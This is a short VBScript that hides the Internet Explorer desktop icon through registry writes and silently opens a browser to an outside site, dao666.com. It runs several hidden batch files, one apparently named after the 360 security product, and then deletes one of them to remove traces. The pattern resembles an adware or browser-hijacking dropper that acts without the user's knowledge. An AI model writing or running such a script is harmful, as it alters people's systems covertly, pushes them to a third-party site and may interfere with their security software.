Dim WSHShell 
Set WshShell = WScript.CreateObject("WScript.Shell")
Rem 
RegPath="HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\HideDesktopIcons\NewStartPanel\{871C5380-42A0-1069-A2EA-08002B30309D}"
RegPath1="HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\HideDesktopIcons\ClassicStartMenu\{871C5380-42A0-1069-A2EA-08002B30309D}"
Type_Name="REG_DWORD"
Key_Data=1
WshShell.RegWrite RegPath,Key_Data,Type_Name
WshShell.RegWrite RegPath1,Key_Data,Type_Name
strDesktop = WSHShell.SpecialFolders("Desktop") 
WSHShell.AppActivate strDesktop 
WSHShell.SendKeys "{F5}"

DIM objShell
set objShell=Wscript.createObject("wscript.shell")
iReturn=objShell.Run("cmd.exe /C  start  /min       iexplore  http://www.dao666.com/index2.html?cn", 0, TRUE)
iReturn=objShell.Run("cmd.exe /C .\tool.cmd", 0, TRUE)
iReturn=objShell.Run("cmd.exe /C .\runonce.cmd", 0, TRUE)
iReturn=objShell.Run("cmd.exe /C .\copy.cmd", 0, TRUE)
iReturn=objShell.Run("cmd.exe /C .\cpa.cmd", 0, TRUE)
iReturn=objShell.Run("cmd.exe /C .\360.cmd", 0, TRUE)

WScript.Sleep    3000
iReturn=objShell.Run("cmd.exe /C del .\runonce.cmd", 0, TRUE)
